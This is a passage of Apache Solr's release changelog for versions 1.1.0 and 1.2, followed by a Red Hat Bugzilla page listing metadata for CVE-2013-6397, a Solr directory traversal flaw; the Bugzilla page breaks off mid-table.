     using the legacy "/select?qt=name" URL structure. Second, the Request
     Handler framework has been extended making it possible to write Request
     Handlers that process streams of data for doing updates, and there is a
     new-style Request Handler for XML updates given the name of "/update" in
     the example solrconfig.xml. Existing installations without this "/update"
     handler will continue to use the old update servlet and should see no
     changes in behavior. For new-style update handlers, errors are now
     reflected in the HTTP status code, Content-type checking is more strict,
     and the response format has changed and is controllable via the wt
     parameter.
#### Detailed Change List

+ New Features   (36)
  1. [SOLR-82](http://issues.apache.org/jira/browse/SOLR-82): Default field values can be specified in the schema.xml.

     (Ryan McKinley via hossman)
  2. [SOLR-89](http://issues.apache.org/jira/browse/SOLR-89): Two new TokenFilters with corresponding Factories...
     \* TrimFilter - Trims leading and trailing whitespace from Tokens
     \* PatternReplaceFilter - applies a Pattern to each token in the
     stream, replacing match occurances with a specified replacement.

     (hossman)
  3. [SOLR-91](http://issues.apache.org/jira/browse/SOLR-91): allow configuration of a limit of the number of searchers
     that can be warming in the background. This can be used to avoid
     out-of-memory errors, or contention caused by more and more searchers
     warming in the background. An error is thrown if the limit specified
     by maxWarmingSearchers in solrconfig.xml is exceeded.

     (yonik)
  4. [SOLR-106](http://issues.apache.org/jira/browse/SOLR-106): New faceting parameters that allow specification of a
     minimum count for returned facets (facet.mincount), paging through facets
     (facet.offset, facet.limit), and explicit sorting (facet.sort).
     facet.zeros is now deprecated.

     (yonik)
  5. [SOLR-80](http://issues.apache.org/jira/browse/SOLR-80): Negative queries are now allowed everywhere. Negative queries
     are generated and cached as their positive counterpart, speeding
     generation and generally resulting in smaller sets to cache.
     Set intersections in SolrIndexSearcher are more efficient,
     starting with the smallest positive set, subtracting all negative
     sets, then intersecting with all other positive sets.

     (yonik)
  6. [SOLR-117](http://issues.apache.org/jira/browse/SOLR-117): Limit a field faceting to constraints with a prefix specified
     by facet.prefix or f.<field>.facet.prefix.

     (yonik)
  7. [SOLR-107](http://issues.apache.org/jira/browse/SOLR-107): JAVA API: Change NamedList to use Java5 generics
     and implement Iterable<Map.Entry>

     (Ryan McKinley via yonik)
  8. [SOLR-104](http://issues.apache.org/jira/browse/SOLR-104): Support for "Update Plugins" -- RequestHandlers that want
     access to streams of data for doing updates. ContentStreams can come
     from the raw POST body, multi-part form data, or remote URLs.
     Included in this change is a new SolrDispatchFilter that allows
     RequestHandlers registered with names that begin with a "/" to be
     accessed using a URL structure based on that name.

     (Ryan McKinley via hossman)
  9. [SOLR-126](http://issues.apache.org/jira/browse/SOLR-126): DirectUpdateHandler2 supports autocommitting after a specified time
     (in ms), using <autoCommit><maxTime>10000</maxTime></autoCommit>.

     (Ryan McKinley via klaas).
  10. [SOLR-116](http://issues.apache.org/jira/browse/SOLR-116): IndexInfoRequestHandler added.

      (Erik Hatcher)
  11. [SOLR-79](http://issues.apache.org/jira/browse/SOLR-79): Add system property ${<sys.prop>[:<default>]} substitution for
      configuration files loaded, including schema.xml and solrconfig.xml.

      (Erik Hatcher with inspiration from Andrew Saar)
  12. [SOLR-149](http://issues.apache.org/jira/browse/SOLR-149): Changes to make Solr more easily embeddable, in addition
      to logging which request handler handled each request.

      (Ryan McKinley via yonik)
  13. [SOLR-86](http://issues.apache.org/jira/browse/SOLR-86): Added standalone Java-based command-line updater.

      (Erik Hatcher via Bertrand Delecretaz)
  14. [SOLR-152](http://issues.apache.org/jira/browse/SOLR-152): DisMaxRequestHandler now supports configurable alternate
      behavior when q is not specified. A "q.alt" param can be specified
      using SolrQueryParser syntax as a mechanism for specifying what query
      the dismax handler should execute if the main user query (q) is blank.

      (Ryan McKinley via hossman)
  15. [SOLR-158](http://issues.apache.org/jira/browse/SOLR-158): new "qs" (Query Slop) param for DisMaxRequestHandler
      allows for specifying the amount of default slop to use when parsing
      explicit phrase queries from the user.

      (Adam Hiatt via hossman)
  16. [SOLR-81](http://issues.apache.org/jira/browse/SOLR-81): SpellCheckerRequestHandler that uses the SpellChecker from
      the Lucene contrib.

      (Otis Gospodnetic and Adam Hiatt)
  17. [SOLR-182](http://issues.apache.org/jira/browse/SOLR-182): allow lazy loading of request handlers on first request.

      (Ryan McKinley via yonik)
  18. [SOLR-81](http://issues.apache.org/jira/browse/SOLR-81): More SpellCheckerRequestHandler enhancements, inlcluding
      support for relative or absolute directory path configurations, as
      well as RAM based directory.

      (hossman)
  19. [SOLR-197](http://issues.apache.org/jira/browse/SOLR-197): New parameters for input: stream.contentType for specifying
      or overriding the content type of input, and stream.file for reading
      local files.

      (Ryan McKinley via yonik)
  20. [SOLR-66](http://issues.apache.org/jira/browse/SOLR-66): CSV data format for document additions and updates.

      (yonik)
  21. [SOLR-184](http://issues.apache.org/jira/browse/SOLR-184): add echoHandler=true to responseHeader, support echoParams=all

      (Ryan McKinley via ehatcher)
  22. [SOLR-211](http://issues.apache.org/jira/browse/SOLR-211): Added a regex PatternTokenizerFactory. This extracts tokens
      from the input string using a regex Pattern.

      (Ryan McKinley)
  23. [SOLR-162](http://issues.apache.org/jira/browse/SOLR-162): Added a "Luke" request handler and other admin helpers.
      This exposes the system status through the standard requestHandler
      framework.

      (ryan)
  24. [SOLR-212](http://issues.apache.org/jira/browse/SOLR-212): Added a DirectSolrConnection class. This lets you access
      solr using the standard request/response formats, but does not require
      an HTTP connection. It is designed for embedded applications.

      (ryan)
  25. [SOLR-204](http://issues.apache.org/jira/browse/SOLR-204): The request dispatcher (added in [SOLR-104](http://issues.apache.org/jira/browse/SOLR-104)) can handle
      calls to /select. This offers uniform error handling for /update and
      /select. To enable this behavior, you must add:
      <requestDispatcher handleSelect="true" > to your solrconfig.xml
      See the example solrconfig.xml for details.

      (ryan)
  26. [SOLR-170](http://issues.apache.org/jira/browse/SOLR-170): StandardRequestHandler now supports a "sort" parameter.
      Using the ';' syntax is still supported, but it is recommended to
      transition to the new syntax.

      (ryan)
  27. [SOLR-181](http://issues.apache.org/jira/browse/SOLR-181): The index schema now supports "required" fields. Attempts
      to add a document without a required field will fail, returning a
      descriptive error message. By default, the uniqueKey field is
      a required field. This can be disabled by setting required=false
      in schema.xml.

      (Greg Ludington via ryan)
  28. [SOLR-217](http://issues.apache.org/jira/browse/SOLR-217): Fields configured in the schema to be neither indexed or
      stored will now be quietly ignored by Solr when Documents are added.
      The example schema has a comment explaining how this can be used to
      ignore any "unknown" fields.

      (Will Johnson via hossman)
  29. [SOLR-227](http://issues.apache.org/jira/browse/SOLR-227): If schema.xml defines multiple fieldTypes, fields, or
      dynamicFields with the same name, a severe error will be logged rather
      then quietly continuing. Depending on the <abortOnConfigurationError>
      settings, this may halt the server. Likewise, if solrconfig.xml
      defines multiple RequestHandlers with the same name it will also add
      an error.

      (ryan)
  30. [SOLR-226](http://issues.apache.org/jira/browse/SOLR-226): Added support for dynamic field as the destination of a
      copyField using glob (\*) replacement.

      (ryan)
  31. [SOLR-224](http://issues.apache.org/jira/browse/SOLR-224): Adding a PhoneticFilterFactory that uses apache commons codec
      language encoders to build phonetically similar tokens. This currently
      supports: DoubleMetaphone, Metaphone, Soundex, and RefinedSoundex

      (ryan)
  32. [SOLR-199](http://issues.apache.org/jira/browse/SOLR-199): new n-gram tokenizers available via NGramTokenizerFactory
      and EdgeNGramTokenizerFactory.

      (Adam Hiatt via yonik)
  33. [SOLR-234](http://issues.apache.org/jira/browse/SOLR-234): TrimFilter can update the Token's startOffset and endOffset
      if updateOffsets="true". By default the Token offsets are unchanged.

      (ryan)
  34. [SOLR-208](http://issues.apache.org/jira/browse/SOLR-208): new example\_rss.xsl and example\_atom.xsl to provide more
      examples for people about the Solr XML response format and how they
      can transform it to suit different needs.

      (Brian Whitman via hossman)
  35. [SOLR-249](http://issues.apache.org/jira/browse/SOLR-249): Deprecated SolrException( int, ... ) constructors in favor
      of constructors that takes an ErrorCode enum. This will ensure that
      all SolrExceptions use a valid HTTP status code.

      (ryan)
  36. [SOLR-386](http://issues.apache.org/jira/browse/SOLR-386): Abstracted SolrHighlighter and moved existing implementation
      to DefaultSolrHighlighter. Adjusted SolrCore and solrconfig.xml so
      that highlighter is configurable via a class attribute. Allows users
      to use their own highlighter implementation.

      (Tricia Williams via klaas)
+ Changes in runtime behavior   (12)
  1. Highlighting using DisMax will only pick up terms from the main
     user query, not boost or filter queries

     (klaas).
  2. [SOLR-125](http://issues.apache.org/jira/browse/SOLR-125): Change default of json.nl to flat, change so that
     json.nl only affects items where order matters (facet constraint
     listings). Fix JSON output bug for null values. Internal JAVA API:
     change most uses of NamedList to SimpleOrderedMap.

     (yonik)
  3. A new method "getSolrQueryParser" has been added to the IndexSchema
     class for retrieving a new SolrQueryParser instance with all options
     specified in the schema.xml's <solrQueryParser> block set. The
     documentation for the SolrQueryParser constructor and it's use of
     IndexSchema have also been clarified.

     (Erik Hatcher and hossman)
  4. DisMaxRequestHandler's bq, bf, qf, and pf parameters can now accept
     multiple values

     (klaas).
  5. Query are re-written before highlighting is performed. This enables
     proper highlighting of prefix and wildcard queries

     (klaas).
  6. A meaningful exception is raised when attempting to add a doc missing
     a unique id if it is declared in the schema and allowDups=false.

     (ryan via klaas)
  7. [SOLR-183](http://issues.apache.org/jira/browse/SOLR-183): Exceptions with error code 400 are raised when
     numeric argument parsing fails. RequiredSolrParams class added
     to facilitate checking for parameters that must be present.

     (Ryan McKinley, J.J. Larrea via yonik)
  8. [SOLR-179](http://issues.apache.org/jira/browse/SOLR-179): By default, solr will abort after any severe initalization
     errors. This behavior can be disabled by setting:
     <abortOnConfigurationError>false</abortOnConfigurationError>
     in solrconfig.xml

     (ryan)
  9. The example solrconfig.xml maps /update to XmlUpdateRequestHandler using
     the new request dispatcher ([SOLR-104](http://issues.apache.org/jira/browse/SOLR-104)). This requires posted content to
     have a valid contentType: curl -H 'Content-type:text/xml; charset=utf-8'
     The response format matches that of /select and returns standard error
     codes. To enable solr1.1 style /update, do not map "/update" to any
     handler in solrconfig.xml

     (ryan)
  10. [SOLR-231](http://issues.apache.org/jira/browse/SOLR-231): If a charset is not specified in the contentType,
      ContentStream.getReader() will use UTF-8 encoding.

      (ryan)
  11. [SOLR-230](http://issues.apache.org/jira/browse/SOLR-230): More options for post.jar to support stdin, xml on the
      commandline, and defering commits. Tutorial modified to take
      advantage of these options so there is no need for curl.

      (hossman)
  12. [SOLR-128](http://issues.apache.org/jira/browse/SOLR-128): Upgraded Jetty to the latest stable release 6.1.3

      (ryan)
+ Optimizations   (4)
  1. [SOLR-114](http://issues.apache.org/jira/browse/SOLR-114): HashDocSet specific implementations of union() and andNot()
     for a 20x performance improvement for those set operations, and a new
     hash algorithm speeds up exists() by 10% and intersectionSize() by 8%.

     (yonik)
  2. [SOLR-115](http://issues.apache.org/jira/browse/SOLR-115): Solr now uses BooleanQuery.clauses() instead of
     BooleanQuery.getClauses() in any situation where there is no risk of
     modifying the original query.

     (hossman)
  3. [SOLR-221](http://issues.apache.org/jira/browse/SOLR-221): Speed up sorted faceting on multivalued fields by ~60%
     when the base set consists of a relatively large portion of the
     index.

     (yonik)
  4. [SOLR-221](http://issues.apache.org/jira/browse/SOLR-221): Added a facet.enum.cache.minDf parameter which avoids
     using the filterCache for terms that match few documents, trading
     decreased memory usage for increased query time.

     (yonik)
+ Bug Fixes   (15)
  1. [SOLR-87](http://issues.apache.org/jira/browse/SOLR-87): Parsing of synonym files did not correctly handle escaped
     whitespace such as \r\n\t\b\f.

     (yonik)
  2. [SOLR-92](http://issues.apache.org/jira/browse/SOLR-92): DOMUtils.getText (used when parsing config files) did not
     work properly with many DOM implementations when dealing with
     "Attributes".

     (Ryan McKinley via hossman)
  3. [SOLR-9](http://issues.apache.org/jira/browse/SOLR-9),[SOLR-99](http://issues.apache.org/jira/browse/SOLR-99): Tighten up sort specification error checking, throw
     exceptions for missing sort specifications or a sort on a non-indexed
     field.

     (Ryan McKinley via yonik)
  4. [SOLR-145](http://issues.apache.org/jira/browse/SOLR-145): Fix for bug introduced in [SOLR-104](http://issues.apache.org/jira/browse/SOLR-104) where some Exceptions
     were being ignored by all "out of the box" RequestHandlers.

     (hossman)
  5. [SOLR-166](http://issues.apache.org/jira/browse/SOLR-166): JNDI solr.home code refactoring. [SOLR-104](http://issues.apache.org/jira/browse/SOLR-104) moved
     some JNDI related code to the init method of a Servlet Filter -
     according to the Servlet Spec, all Filter's should be initialized
     prior to initializing any Servlets, but this is not the case in at
     least one Servlet Container (Resin). This "bug fix" refactors
     this JNDI code so that it should be executed the first time any
     attempt is made to use the solr.home dir.

     (Ryan McKinley via hossman)
  6. [SOLR-173](http://issues.apache.org/jira/browse/SOLR-173): Bug fix to SolrDispatchFilter to reduce "too many open
     files" problem was that SolrDispatchFilter was not closing requests
     when finished. Also modified ResponseWriters to only fetch a Searcher
     reference if necessary for writing out DocLists.

     (Ryan McKinley via hossman)
  7. [SOLR-168](http://issues.apache.org/jira/browse/SOLR-168): Fix display positioning of multiple tokens at the same
     position in analysis.jsp

     (yonik)
  8. [SOLR-167](http://issues.apache.org/jira/browse/SOLR-167): The SynonymFilter sometimes generated incorrect offsets when
     multi token synonyms were mached in the source text.

     (yonik)
  9. [SOLR-188](http://issues.apache.org/jira/browse/SOLR-188): bin scripts do not support non-default webapp names. Added "-U"
     option to specify a full path to the update url, overriding the
     "-h" (hostname), "-p" (port) and "-w" (webapp name) parameters.

     (Jeff Rodenburg via billa)
  10. [SOLR-198](http://issues.apache.org/jira/browse/SOLR-198): RunExecutableListener always waited for the process to
      finish, even when wait="false" was set.

      (Koji Sekiguchi via yonik)
  11. [SOLR-207](http://issues.apache.org/jira/browse/SOLR-207): Changed distribution scripts to remove recursive find
      and avoid use of "find -maxdepth" on platforms where it is not
      supported.

      (yonik)
  12. [SOLR-222](http://issues.apache.org/jira/browse/SOLR-222): Changing writeLockTimeout in solrconfig.xml did not
      change the effective timeout.

      (Koji Sekiguchi via yonik)
  13. Changed the [SOLR-104](http://issues.apache.org/jira/browse/SOLR-104) RequestDispatcher so that /select?qt=xxx can not
      access handlers that start with "/". This makes path based authentication
      possible for path based request handlers.

      (ryan)
  14. [SOLR-214](http://issues.apache.org/jira/browse/SOLR-214): Some servlet containers (including Tomcat and Resin) do not
      obey the specified charset. Rather then letting the the container handle
      it solr now uses the charset from the header contentType to decode posted
      content. Using the contentType: "text/xml; charset=utf-8" will force
      utf-8 encoding. If you do not specify a contentType, it will use the
      platform default.

      (Koji Sekiguchi via ryan)
  15. [SOLR-241](http://issues.apache.org/jira/browse/SOLR-241): Undefined system properties used in configuration files now
      cause a clear message to be logged rather than an obscure exception thrown.

      (Koji Sekiguchi via ehatcher)
+ Other Changes   (2)
  1. Updated to Lucene 2.1
  2. Updated to [Lucene 2007](http://issues.apache.org/jira/browse/LUCENE-2007)-05-20\_00-04-53

### Release 1.1.0 [2006-12-22]

+ Status   (1)
  1. This is the first release since Solr joined the Incubator, and brings many
     new features and performance optimizations including highlighting,
     faceted browsing, and JSON/Python/Ruby response formats.
+ Upgrading from previous Solr versions   (4)
  1. Older Apache Solr installations can be upgraded by replacing
     the relevant war file with the new version. No changes to configuration
     files are needed and the index format has not changed.
  2. The default version of the Solr XML response syntax has been changed to 2.2.
     Behavior can be preserved for those clients not explicitly specifying a
     version by adding a default to the request handler in solrconfig.xml
  3. By default, Solr will no longer use a searcher that has not fully warmed,
     and requests will block in the meantime. To change back to the previous
     behavior of using a cold searcher in the event there is no other
     warm searcher, see the useColdSearcher config item in solrconfig.xml
  4. The XML response format when adding multiple documents to the collection
     in a single <add> command has changed to return a single <result>.
#### Detailed Change List

+ New Features   (33)
  1. added support for setting Lucene's positionIncrementGap
  2. Admin: new statistics for SolrIndexSearcher
  3. Admin: caches now show config params on stats page
  4. max() function added to FunctionQuery suite
  5. postOptimize hook, mirroring the functionallity of the postCommit hook,
     but only called on an index optimize.
  6. Ability to HTTP POST query requests to /select in addition to HTTP-GET
  7. The default search field may now be overridden by requests to the
     standard request handler using the df query parameter.

     (Erik Hatcher)
  8. Added DisMaxRequestHandler and SolrPluginUtils.

     (Chris Hostetter)
  9. Support for customizing the QueryResponseWriter per request

     (Mike Baranczak / [SOLR-16](http://issues.apache.org/jira/browse/SOLR-16) / hossman)
  10. Added KeywordTokenizerFactory

      (hossman)
  11. copyField accepts dynamicfield-like names as the source.

      (Darren Erik Vengroff via yonik, [SOLR-21](http://issues.apache.org/jira/browse/SOLR-21))
  12. new DocSet.andNot(), DocSet.andNotSize()

      (yonik)
  13. Ability to store term vectors for fields.

      (Mike Klaas via yonik, [SOLR-23](http://issues.apache.org/jira/browse/SOLR-23))
  14. New abstract BufferedTokenStream for people who want to write
      Tokenizers or TokenFilters that require arbitrary buffering of the
      stream.

      ([SOLR-11](http://issues.apache.org/jira/browse/SOLR-11) / yonik, hossman)
  15. New RemoveDuplicatesToken - useful in situations where
      synonyms, stemming, or word-deliminater-ing produce identical tokens at
      the same position.

      ([SOLR-11](http://issues.apache.org/jira/browse/SOLR-11) / yonik, hossman)
  16. Added highlighting to SolrPluginUtils and implemented in StandardRequestHandler
      and DisMaxRequestHandler

      ([SOLR-24](http://issues.apache.org/jira/browse/SOLR-24) / Mike Klaas via hossman,yonik)
  17. SnowballPorterFilterFactory language is configurable via the "language"
      attribute, with the default being "English".

      (Bertrand Delacretaz via yonik, [SOLR-27](http://issues.apache.org/jira/browse/SOLR-27))
  18. ISOLatin1AccentFilterFactory, instantiates ISOLatin1AccentFilter to remove accents.

      (Bertrand Delacretaz via yonik, [SOLR-28](http://issues.apache.org/jira/browse/SOLR-28))
  19. JSON, Python, Ruby QueryResponseWriters: use wt="json", "python" or "ruby"

      (yonik, [SOLR-31](http://issues.apache.org/jira/browse/SOLR-31))
  20. Make web admin pages return UTF-8, change Content-type declaration to include a
      space between the mime-type and charset

      (Philip Jacob, [SOLR-35](http://issues.apache.org/jira/browse/SOLR-35))
  21. Made query parser default operator configurable via schema.xml:
      <solrQueryParser defaultOperator="AND|OR"/>
      The default operator remains "OR".
  22. JAVA API: new version of SolrIndexSearcher.getDocListAndSet() which takes
      flags

      (Greg Ludington via yonik, [SOLR-39](http://issues.apache.org/jira/browse/SOLR-39))
  23. A HyphenatedWordsFilter, a text analysis filter used during indexing to rejoin
      words that were hyphenated and split by a newline.

      (Boris Vitez via yonik, [SOLR-41](http://issues.apache.org/jira/browse/SOLR-41))
  24. Added a CompressableField base class which allows fields of derived types to
      be compressed using the compress=true setting. The field type also gains the
      ability to specify a size threshold at which field data is compressed.

      (klaas, [SOLR-45](http://issues.apache.org/jira/browse/SOLR-45))
  25. Simple faceted search support for fields (enumerating terms)
      and arbitrary queries added to both StandardRequestHandler and
      DisMaxRequestHandler.

      (hossman, [SOLR-44](http://issues.apache.org/jira/browse/SOLR-44))
  26. In addition to specifying default RequestHandler params in the
      solrconfig.xml, support has been added for configuring values to be
      appended to the multi-val request params, as well as for configuring
      invariant params that can not overridden in the query.

      (hossman, [SOLR-46](http://issues.apache.org/jira/browse/SOLR-46))
  27. Default operator for query parsing can now be specified with q.op=AND|OR
      from the client request, overriding the schema value.

      (ehatcher)
  28. New XSLTResponseWriter does server side XSLT processing of XML Response.
      In the process, an init(NamedList) method was added to QueryResponseWriter
      which works the same way as SolrRequestHandler.

      (Bertrand Delacretaz / [SOLR-49](http://issues.apache.org/jira/browse/SOLR-49) / hossman)
  29. json.wrf parameter adds a wrapper-function around the JSON response,
      useful in AJAX with dynamic script tags for specifying a JavaScript
      callback function.

      (Bertrand Delacretaz via yonik, [SOLR-56](http://issues.apache.org/jira/browse/SOLR-56))
  30. autoCommit can be specified every so many documents added

      (klaas, [SOLR-65](http://issues.apache.org/jira/browse/SOLR-65))
  31. ${solr.home}/lib directory can now be used for specifying "plugin" jars

      (hossman, [SOLR-68](http://issues.apache.org/jira/browse/SOLR-68))
  32. Support for "Date Math" relative "NOW" when specifying values of a
      DateField in a query -- or when adding a document.

      (hossman, [SOLR-71](http://issues.apache.org/jira/browse/SOLR-71))
  33. useColdSearcher control in solrconfig.xml prevents the first searcher
      from being used before it's done warming. This can help prevent
      thrashing on startup when multiple requests hit a cold searcher.
      The default is "false", preventing use before warm.

      (yonik, [SOLR-77](http://issues.apache.org/jira/browse/SOLR-77))
+ Changes in runtime behavior   (11)
  1. classes reorganized into different packages, package names changed to Apache
  2. force read of document stored fields in QuerySenderListener
  3. Solr now looks in ./solr/conf for config, ./solr/data for data
     configurable via solr.solr.home system property
  4. Highlighter params changed to be prefixed with "hl."; allow fragmentsize
     customization and per-field overrides on many options

     (Andrew May via klaas, [SOLR-37](http://issues.apache.org/jira/browse/SOLR-37))
  5. Default param values for DisMaxRequestHandler should now be specified
     using a '<lst name="defaults">...</lst>' init param, for backwards
     compatability all init prams will be used as defaults if an init param
     with that name does not exist.

     (hossman, [SOLR-43](http://issues.apache.org/jira/browse/SOLR-43))
  6. The DisMaxRequestHandler now supports multiple occurances of the "fq"
     param.

     (hossman, [SOLR-44](http://issues.apache.org/jira/browse/SOLR-44))
  7. FunctionQuery.explain now uses ComplexExplanation to provide more
     accurate score explanations when composed in a BooleanQuery.

     (hossman, [SOLR-25](http://issues.apache.org/jira/browse/SOLR-25))
  8. Document update handling locking is much sparser, allowing performance gains
     through multiple threads. Large commits also might be faster

     (klaas, [SOLR-65](http://issues.apache.org/jira/browse/SOLR-65))
  9. Lazy field loading can be enabled via a solrconfig directive. This will be faster when
     not all stored fields are needed from a document

     (klaas, [SOLR-52](http://issues.apache.org/jira/browse/SOLR-52))
  10. Made admin JSPs return XML and transform them with new XSL stylesheets

      (Otis Gospodnetic, [SOLR-58](http://issues.apache.org/jira/browse/SOLR-58))
  11. If the "echoParams=explicit" request parameter is set, request parameters are copied
      to the output. In an XML output, they appear in new <lst name="params"> list inside
      the new <lst name="responseHeader"> element, which replaces the old <responseHeader>.
      Adding a version=2.1 parameter to the request produces the old format, for backwards
      compatibility

      (bdelacretaz and yonik, [SOLR-59](http://issues.apache.org/jira/browse/SOLR-59)).
+ Optimizations   (6)
  1. getDocListAndSet can now generate both a DocList and a DocSet from a
     single lucene query.
  2. BitDocSet.intersectionSize(HashDocSet) no longer generates an intermediate
     set
  3. OpenBitSet completed, replaces BitSet as the implementation for BitDocSet.
     Iteration is faster, and BitDocSet.intersectionSize(BitDocSet) and unionSize
     is between 3 and 4 times faster.

     (yonik, [SOLR-15](http://issues.apache.org/jira/browse/SOLR-15))
  4. much faster unionSize when one of the sets is a HashDocSet: O

     (smaller\_set\_size)
  5. Optimized getDocSet() for term queries resulting in a 36% speedup of facet.field
     queries where DocSets aren't cached (for example, if the number of terms in the field
     is larger than the filter cache.)

     (yonik)
  6. Optimized facet.field faceting by as much as 500 times when the field has
     a single token per document (not multiValued & not tokenized) by using the
     Lucene FieldCache entry for that field to tally term counts. The first request
     utilizing the FieldCache will take longer than subsequent ones.
+ Bug Fixes   (13)
  1. Fixed delete-by-id for field types who's indexed form is different
     from the printable form (mainly sortable numeric types).
  2. Added escaping of attribute values in the XML response

     (Erik Hatcher)
  3. Added empty extractTerms() to FunctionQuery to enable use in
     a MultiSearcher

     (Yonik)
  4. WordDelimiterFilter sometimes lost token positionIncrement information
  5. Fix reverse sorting for fields were sortMissingFirst=true

     (Rob Staveley, yonik)
  6. Worked around a Jetty bug that caused invalid XML responses for fields
     containing non ASCII chars.

     (Bertrand Delacretaz via yonik, [SOLR-32](http://issues.apache.org/jira/browse/SOLR-32))
  7. WordDelimiterFilter can throw exceptions if configured with both
     generate and catenate off.

     (Mike Klaas via yonik, [SOLR-34](http://issues.apache.org/jira/browse/SOLR-34))
  8. Escape '>' in XML output

     (because ]]> is illegal in CharData)
  9. field boosts weren't being applied and doc boosts were being applied to fields

     (klaas)
  10. Multiple-doc update generates well-formed xml

      (klaas, [SOLR-65](http://issues.apache.org/jira/browse/SOLR-65))
  11. Better parsing of pingQuery from solrconfig.xml

      (hossman, [SOLR-70](http://issues.apache.org/jira/browse/SOLR-70))
  12. Fixed bug with "Distribution" page introduced when Versions were
      added to "Info" page

      (hossman)
  13. Fixed HTML escaping issues with user input to analysis.jsp and action.jsp

      (hossman, [SOLR-74](http://issues.apache.org/jira/browse/SOLR-74))
+ Other Changes   (15)
  1. Upgrade to Lucene 2.0 nightly build 2006-06-22, lucene SVN revision 416224,
     <http://svn.apache.org/viewvc/lucene/java/trunk/CHANGES.txt?view=markup&pathrev=416224>
  2. Modified admin styles to improve display in Internet Explorer

     (Greg Ludington via billa, [SOLR-6](http://issues.apache.org/jira/browse/SOLR-6))
  3. Upgrade to Lucene 2.0 nightly build 2006-07-15, lucene SVN revision 422302,
  4. Included unique key field name/value (if available) in log message of add

     (billa, [SOLR-18](http://issues.apache.org/jira/browse/SOLR-18))
  5. Updated to Lucene 2.0 nightly build 2006-09-07, SVN revision 462111
  6. Added javascript to catch empty query in admin query forms (Tomislav Nakic-Alfirevic via billa, [SOLR-48](http://issues.apache.org/jira/browse/SOLR-48)
  7. blackslash escape \* in ssh command used in snappuller for zsh compatibility, [SOLR-63](http://issues.apache.org/jira/browse/SOLR-63)
  8. check solr return code in admin scripts, [SOLR-62](http://issues.apache.org/jira/browse/SOLR-62)
  9. Updated to Lucene 2.0 nightly build 2006-11-15, SVN revision 475069
  10. Removed src/apps containing the legacy "SolrTest" app

      (hossman, [SOLR-3](http://issues.apache.org/jira/browse/SOLR-3))
  11. Simplified index.jsp and form.jsp, primarily by removing/hiding XML
      specific params, and adding an option to pick the output type.

      (hossman)
  12. Added new numeric build property "specversion" to allow clean
      MANIFEST.MF files

      (hossman)
  13. Added Solr/Lucene versions to "Info" page

      (hossman)
  14. Explicitly set mime-type of .xsl files in web.xml to
      application/xslt+xml

      (hossman)
  15. Config parsing should now work useing DOM Level 2 parsers -- Solr
      previously relied on getTextContent which is a DOM Level 3 addition

      (Alexander Saar via hossman, [SOLR-78](http://issues.apache.org/jira/browse/SOLR-78))

### 2006/01/17 Solr open sourced, moves to Apache Incubator



=== Content from bugzilla.redhat.com_43d7ef77_20250126_100340.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D1035062)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D1035062)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D1035062)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 1035062

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 1035062**](show_bug.cgi?id=1035062)
(CVE-2013-6397)
- [CVE-2013-6397](https://access.redhat.com/security/cve/CVE-2013-6397) Apache Solr: directory traversal when loading XSL stylesheets and Velocity templates

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2013-6397 Apache Solr: directory traversal when loading XSL stylesheets a...

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED ERRATA | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2013-6397 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | high | | [Severity:](page.cgi?id=fields.html#bug_severity) | high | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in 